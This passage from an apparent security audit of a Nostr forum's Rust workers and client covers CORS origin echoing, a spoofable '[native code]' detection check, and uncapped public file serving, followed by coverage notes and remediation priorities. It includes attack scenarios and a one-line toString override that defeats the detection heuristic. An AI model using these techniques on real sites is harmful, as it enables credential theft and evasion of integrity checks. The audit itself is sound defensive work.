- **CVSS 3.1:** 4.3 AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N
- **Location:** `crates/relay-worker/src/lib.rs` (CORS handler), `crates/pod-worker/src/lib.rs`
- **Observed:** `ALLOWED_ORIGINS` is a comma-separated env var; when the `Origin` header matches, the server echoes it verbatim and sets `Access-Control-Allow-Credentials: true`. If `ALLOWED_ORIGINS` includes a wildcard-like entry (`*.dreamlab-ai.com`) or a misconfigured production entry (`http://localhost:*`), credentialed CSRF becomes possible.
- **Attack scenario:** A developer leaves `http://localhost:5173` in production `ALLOWED_ORIGINS`. Attacker's victim visits `http://localhost:5173` (e.g. a local service on their machine) → the attacker makes authenticated cross-origin requests with cookies.
- **Recommendation:**
  - Treat `ALLOWED_ORIGINS` as an exact-match whitelist. Reject entries containing `*` or `localhost` in the prod wrangler config.
  - Add a deploy-time assertion: production bundles must not include `localhost` or `127.0.0.1` in this list.
- **Effort:** trivial

---

### S-030 Client uses `[native code]` string check to detect Bitwarden/ProtonPass interception
- **Category:** client integrity
- **Severity:** low
- **CVSS 3.1:** 3.1 AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N
- **Location:** `forum-client/src/auth/passkey.rs:*`
- **Observed:** The client heuristically detects password-manager interception by calling `navigator.credentials.create.toString()` and checking for `[native code]`. A malicious extension that defines `toString() { return "function create() { [native code] }"; }` defeats the check.
- **Attack scenario:** Hostile extension (or supply-chain attack in a legit extension) wraps `navigator.credentials.create` to silently siphon PRF material while spoofing the detection heuristic.
- **Recommendation:** Remove the check entirely — it is not a security boundary; treat the browser/extension surface as trusted and invest in CSP + SRI instead. Alternatively, use `Function.prototype.toString.call(...)` via a pristine reference captured at `document-start` and compare against a small allowlist.
- **Effort:** trivial

---

### S-031 No response-size cap on pod GET / public file serving
- **Category:** DoS / info
- **Severity:** info
- **CVSS 3.1:** 0.0 (informational)
- **Location:** `crates/pod-worker/src/*.rs` (GET handler)
- **Observed:** Public pod GETs stream straight from R2. A large object (up to 50 MB per quota) can be requested in parallel N times.
- **Attack scenario:** Bandwidth amplification from a cohort-visible file. Not novel — standard CDN exposure, mitigated by Cloudflare's default DDoS layer, but worth flagging so the team considers a cache rule.
- **Recommendation:** Add `Cache-Control: public, max-age=300` on public pod responses so Cloudflare absorbs repeated fetches. No code change required beyond header injection.
- **Effort:** trivial

---

## 3. Coverage notes

**Files reviewed in detail:**
- `crates/auth-worker/src/{webauthn.rs, pod.rs, http.rs, rate_limit.rs, admin.rs, auth.rs, schema.rs, lib.rs}`
- `crates/nostr-core/src/{nip98.rs, keys.rs, event.rs, nip44.rs}`
- `crates/relay-worker/src/{auth.rs, whitelist.rs, moderation.rs, trust.rs, audit.rs, nip11.rs, lib.rs}`
- `crates/relay-worker/src/relay_do/{mod.rs, nip_handlers.rs, filter.rs, storage.rs, session.rs, broadcast.rs}`
- `crates/pod-worker/src/{patch.rs, quota.rs, provision.rs, remote_storage.rs, webid.rs}`
- `forum-client/src/auth/{webauthn.rs, passkey.rs, session.rs, nip98.rs, nip07.rs, http.rs}`
- Workspace `Cargo.toml` and per-crate `Cargo.toml`
- `.gitignore` (verified `.env*` coverage)

**Files noted but not exhaustively reviewed** (candidates for a follow-up audit in the sprint-after-next):
- `crates/pod-worker/src/{auth.rs, conditional.rs, container.rs, content_negotiation.rs, notifications.rs, payments.rs}`
- `crates/relay-worker/src/relay_do/{moderation_events.rs, gift_wrap.rs, groups.rs, calendar.rs, deletion.rs, types.rs, wasm_bridge.rs}`
- `crates/search-worker/src/**` (entire crate)
- `crates/preview-worker/src/**` (fetch + og_parse referenced from Grep-level reads only)
- All five `wrangler.toml` files (env bindings, secrets, R2/KV/D1 scopes)

**Recommended next pass after Obelisk-Polish:** deep-dive `gift_wrap.rs` (NIP-17/44 DM plumbing), `moderation_events.rs` (NIP-56 reports auto-hide logic), and `groups.rs` (NIP-29 admin-only kinds 9000/9001/9005/39000). These carry the privacy and moderation trust model and were deliberately deferred from this pass to stay within budget.

---

## 4. Remediation priorities

**Immediate (before next release):** S-001, S-002, S-003, S-004, S-005, S-006, S-007, S-010.
Address in that order. S-001 + S-002 together require a `passkey-types` integration spike — budget ~2 days. S-003/S-006/S-007 are each <1 hour of work. S-005 is 15 minutes.

**Next sprint:** S-008, S-009, S-013, S-014, S-015, S-016, S-017, S-018, S-019, S-020, S-021, S-022, S-023.

**Hygiene / backlog:** S-011, S-012, S-024, S-025, S-026, S-027, S-028, S-029, S-030, S-031.

---

*End of audit.*
